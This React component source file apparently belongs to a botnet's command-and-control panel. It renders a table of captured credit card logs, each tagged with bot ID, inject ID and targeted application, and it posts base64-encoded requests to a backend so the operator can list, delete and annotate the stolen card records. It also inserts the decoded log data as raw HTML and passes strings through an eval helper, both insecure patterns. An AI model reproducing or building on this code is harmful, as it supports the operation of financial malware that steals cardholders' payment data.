import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { Link } from 'react-router-dom';
import EditCommentUniversal from '../EditCommentUniversal';
import { try_eval } from '../../serviceF';

//'{"sent_request":"getLogsCC"}' 

class CCsLogsRow extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
          logs: null,
          look: false,
          defaultComment: null
        };

    }

    LookBtnClick(){
        this.setState({
            look: !this.state.look
        });
    }

   
    ListLogs() {
        let liobj = '';

        for(let obj in this.state.logs) {
            liobj +=  obj + ': ' + this.state.logs[obj] + '<br/>';
        }

        return (
            <a class="list-group ulBank" dangerouslySetInnerHTML={{__html: liobj}}  />
        );
    }

    LookBtnClass(){
        return this.state.look ? "fal fa-eye" : "fal fa-low-vision";
    }

    componentDidMount() {
        try {
            let _logs = new Buffer(this.props.logs.toString()  == null ? '' : this.props.logs.toString(), 'base64').toString('utf-8');
            this.setState({
                logs: JSON.parse(_logs)
            });
        }
        catch (err) {}
    }

    ChangeDefaultComment(newComment) {
        this.setState({
            defaultComment: newComment
        });
    }

    OnDeleteThis() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"l_r_cards","idinj":"' + this.props.idinj + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.props.UpdateThisComponent();
                }
                else {
                    try_eval('$.notify("Removed log ", "info");');
                    this.props.UpdateThisComponent();
                }
                
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error removing log. Look console for more details.');
               // console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }
    
    render() {
        let loglist = this.state.look ? this.ListLogs() : <React.Fragment />;

        let width = {
            width: this.state.look ? '50%' : '50px',
            padding: '0px'
        }

        let CommentStyle = {
            padding: '5px'
        }

        let _comment = '';
        try {
            if(this.state.defaultComment == null) {
                _comment = new Buffer(this.props.comment.toString()  == null ? '' :  this.props.comment.toString(), 'base64').toString('utf-8');
            }
            else {
                _comment = this.state.defaultComment;
            }
        }
        catch (err) {
            _comment = this.props.comment;
        }
        
        let textAlignCenter = {
            textAlign: 'center'
        }

        return (
            <tr>

                 <td class="check-bot" style={({textAlign: 'right',padding: '0px', width:'38px'})}><i class="fal fa-trash-alt" onClick={this.OnDeleteThis.bind(this)} style={({marginRight: '10px'})}></i></td>
                  <td>{this.ListLogs()}</td>
                  <td>{this.props.application}</td>
                  <td>{this.props.idbot}</td> 
                 <td style={CommentStyle}><EditCommentUniversal parentObj={this} idinj={this.props.idinj} text={_comment} request="change_comment_cards" /></td>

            </tr>
        );
    }
}

class CCsLogsTable extends React.Component {
    
    constructor(props) {
        super(props);
        this.state = {
            isBotSelected: isNullOrUndefined(this.props.botID),
            error: null,
            isLoaded: false,
            LogsList: []
        };

        this.onLoadJson = this.onLoadJson.bind(this);
    }
    
    componentDidMount() {
        this.onLoadJson(1);
        try_eval('UpdateToolTips();');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }


    autoUpdate() {
        if(SettingsContext.autoUpdateEnable)
            this._timer = setInterval(() => this.onLoadJson(this.state.currentPage), SettingsContext.autoUpdateDelay * 10);
    }

    componentWillReceiveProps(newProps) {
        this.onLoadJson();
    }

    componentWillUnmount() {
        this.DisableTimer();
    }

    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }

    UpdateThisComponent() {
        this.onLoadJson();
    }

    onLoadJson () {
        this.DisableTimer();

        let paramslink = this.state.isBotSelected ? '{"sent_request":"data_log_cards"}' : '{"sent_request":"data_log_cards","ID":"' + this.props.botID + '"}';

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(paramslink).toString('base64')
            }
        });

        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.setState({
                        error: result.error
                    });
                }
                else {
                    this.setState({
                        isLoaded: true,
                        LogsList: result.logsCCs
                    });
                }
                
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading CC logs table. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));

        this.autoUpdate();
    }

 

    render () {
        const { error, isLoaded, LogsList } = this.state;
        if (error) {
            return <div>Error: {error}</div>;
        }
        else if (!isLoaded) {
            return <div class="load-4"><div class="ring-1"></div></div>
        }
        else {
            const tdw = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '31px',
                width: '55px'
            }

            const CommentWidth = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '31px',
                width: '350px',
                minWidth: '150px'
            }

            const tdw3 = {
                padding: '0px',
                fontSize: '26px',
              textAlign: 'center',
              width: '50px'
            
            }

            return (
                <React.Fragment>
                   <table  class="table table-striped table-dark" id="table1">
                        <thead>
                            <tr>
                                <th></th>
                                <th scope="col" style={tdw}><i class="fas fa-clipboard-list"/></th>
                                <th scope="col" style={tdw3}><i class="fas fa-university"></i></th>
                                <th scope="col" style={tdw3}><i class="fa fa-users" /></th> 
                                <th scope="col" style={CommentWidth}><i class="far fa-comment"/></th>
                            </tr>
                        </thead>
                        <tbody>
                        {this.state.LogsList.map(item => (
                            <CCsLogsRow UpdateThisComponent={this.UpdateThisComponent.bind(this)} isBotSelected={this.state.isBotSelected} idinj={item.IL} idbot={item.ID} application={item.AS} logs={item.LS} comment={item.CT} />
                  
                       ))}
                        </tbody>
                    </table>
                </React.Fragment>
            );
        }
    }
}

export default CCsLogsTable;